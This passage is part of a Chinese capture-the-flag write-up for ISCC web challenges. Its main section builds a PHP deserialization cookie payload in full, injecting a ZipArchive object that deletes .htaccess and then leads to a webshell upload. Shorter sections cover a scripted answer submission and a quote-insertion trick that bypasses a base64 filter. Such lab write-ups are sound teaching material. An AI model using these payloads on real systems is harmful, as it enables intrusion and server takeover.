            echo "$class->$methodn";
        }
      }
    ?>
列举结果：
    $ php list.php
    SQLite3->open
    SessionHandler->open
    XMLReader->open
    ZipArchive->open
经过寻找，共发现有4个类带有open()方法。如果在$files数组中，注入这些类中任意一个的序列化对象，我们就可以通过带有特定参数的open动作，来调用这些类中的方法。
其中的大部分类都能够对文件进行操作。回到之前，我们知道`.htaccess`会在沙盒中阻止我们执行PHP。所以，假如能通过某种方式删掉`.htaccess`文件，那么就成功了。
通过对上面的4个类进行测试，发现，ZipArchive->open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。
`ZipArchive::open`的第一个参数是文件名，第二个参数是flags，而9对应的是`ZipArchive::CREATE |
ZipArchive::OVERWRITE`。`ZipArchive::OVERWRITE`的意思是重写覆盖文件，这个操作会删除原来的文件。
因为UploadFile类的open函数的参数是fakename和realname，fakename对应.htaccess，realname对应flags，这里直接使用`ZipArchive::OVERWRITE`的integer值9，这样我们就可以使用ZipArchive->open()来删除`.htaccess`文件。
**分析编写payload**
先序列化一个ZipArchive类的对象：
    fakename = "sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";
    $zip->realname = "9";
    echo serialize($zip);
    O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";}
然后随便上传两个文件，查看cookie得到序列化的值
    a:2:{i:0;O:10:"UploadFile":2:{s:8:"fakename";s:9:"pictu.jpg";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";}i:1;O:10:"UploadFile":2:{s:8:"fakename";s:7:"qwe.jpg";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg";}}f96f37cca80ecae3c5f2f30be497c27024a23a24093e9e7a26c9721be025fb7b
根据前面的探索利用，将第二个文件的fakename改成需要构造的ZipArchive的序列化值，如果想单独溢出注入ZipArchive对象，就需要将第二个文件对象中fakename值的前后部分都需要被溢出才行：
  * 后面部分：
    ";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg
67个无用字符，所以ZipArchive序列化对象中的comment的长度为67，部分构造如下：
    i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"
  * 前面部分：
因为第一个文件对象中的fakename需要溢出到第二个文件的fakename值的位置，所以第二个文件对象的fakename值还需要加一部分：
    ";s:8:"realname";s:1:"A";}
PS：此处的realname内容是什么无所谓，主要是为了序列化的完整性
第二个文件对象最终的fakename值如下：
    ";s:8:"realname";s:1:"A";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"
处理完第二个文件对象的fakename就需要处理第一个文件对象的fakename：
同时，要想ZipArchive对象成功溢出，就需要从第一个文件对象fakename值溢出到第二个文件对象的fakename值，所以第一个fakename值需要溢出的部分为：
    ";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";}i:1;O:10:"UploadFile":2:{s:8:"fakename";s:7:"
可是这样是不正确的，正确部分的应该是：
    ";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";}i:1;O:10:"UploadFile":2:{s:8:"fakename";s:253:"
因为我们必须先修改第二个对象的fakename值，然后才能依据重新反序列化的Cooke[files]修改第一个的fakename，而此时的第二个fakename长度已经改变，不再是7，所以这部分溢出的长度为117，因此第一个文件的fakename值就是117个`../`。
    ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
**最终payload**
依据上述的分析，先修改第二个文件对象的fakename然后再修改第一个文件对象的fakename(不能互换！！！)
第二个文件对象的fakename:
    ";s:8:"realname";s:1:"A";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"
第一个文件对象的fakename:
    ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../
修改伪造之后成功伪造引入非法对象的Cookie
    a:2:{i:0;O:10:"UploadFile":2:{s:8:"fakename";s:351:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";}i:1;O:10:"UploadFile":2:{s:8:"fakename";s:253:"";s:8:"realname";s:1:"A";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg";}}cc2ffa6941ffc8895e4c029f62046ab7963af6ec9e5061103d71a295834b388b
查看非法对象Cookie中files的文件对象数组
    php > print_r(unserialize($X));
    Array 
    (   
        [0] => __PHP_Incomplete_Class Object 
            (  
                [__PHP_Incomplete_Class_Name] => UploadFile   
                [fakename] => ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";}i:1;O:10:"UploadFile":2:{s:8:"fakename";s:253:" 
                [realname] => A     
            )        
        [1] => ZipArchive Object
            ( 
                [status] => 0   
                [statusSys] => 0  
                [numFiles] => 0     
                [filename] => 
                [comment] => 
                [fakename] => sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess
                [realname] => 9   
            )  
    )
最后访问`index.php?action=open&i=1`，服务器直接操作files数组中i=1索引的对象执行open()方法，即ZipArchive的open函数，删除`.htaccess`文件。
之后，直接上传webshell拿到服务器权限
    shell.php is in folder sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/cf9c5d4cdaab48d9872f7029d1cd642431e58193.php
    flag{ghs_aswoer_nmxld}
###  Where is file?
考点：文件包含
题目源码直接给了
解密数据`qKe4j6uFeqaTe5rVqqaXiKig25o=`
从结果可以看到密钥key为`666`，解密结果为`BFS_ISCC_First_Prize`
    flag{BFS_ISCC_First_Prize}
###  神秘组织的邮件-2
考点：脚本编写、代码审计
题目打开有一串数字字符还有一个提交按钮
看数字和Result提交，猜测是计算上面的四个数然后提交结果，但是应该是什么样的四则运算呢？？依据上一题`神秘组织的邮件-1`解出的flag提示进行解题：`flag{加减乘除}`
知道表达式的运算规则之后，编写脚本进行测试利用
    import re
    import requests
    url='http://101.201.126.95:7010/index.php'
    r = requests.session()
    text = r.get(url).text
    calc = str(re.findall('(.*?)', text))[2:-2]
    #print(text)
    #print(calc)
    s1 = calc.replace('  ', '+', 1)
    s2 = s1.replace('  ', '-', 1)
    s3 = s2.replace('  ', '*', 1)
    s4 = s3.replace('  ', '/', 1)
    print(s4)
    ans = eval(s4)
    print(ans)
    data = {'result':ans, 'submit':'提交'}
    url1 = 'http://101.201.126.95:7010/result.php'
    res = r.post(url1, data=data)
    print(res.text)
    print(res.headers)
    print(res.status_code)
运行脚本得到页面的其它回显信息
    34685+95037-7*786/2
    126971.0
        download
    ?>
        下载文件
从认证回显结果可以看到有一个txt文件可以下载，尝试访问得到部分源码（这里有一个坑！！！，不能直接访问`IS20CC20abc%$.txt`，需要对`%$`进行URL编码，不然会报404错误`Your
browser sent a request that this server could not understand`）
正确的URL访问如下：
    http://101.201.126.95:7010/IS20CC20abc%25%24.txt
`IS20CC20abc%$.txt`：
    $pp = trim(base64_decode($result));
    if ($pp === 'flag.php') {
        header ( "Location: ./flag.php" );
审计部分代码可知，需要变量`$result`值经过base64解码之后等于字符串`flag.php`
base64编码字符串`flag.php` —>> `ZmxhZy5waHA=`
继续回到主页面，提交`ZmxhZy5waHA=`，可是发现页面并没有跳转到`./flag.php`，猜测存在过滤，对`ZmxhZy5waHA=`进行改写绕过过滤：`Z'm'x'h'Z'y'5'w'a'H'A'=`
回到主页面提交特定字符串跳转到`./flag.php`得到flag
    flag{welcomekenan{toiscc}}
###  阿帅的爱情
考点：命令注入
题目直接给了源码让进行审计，如下：
    getMessage();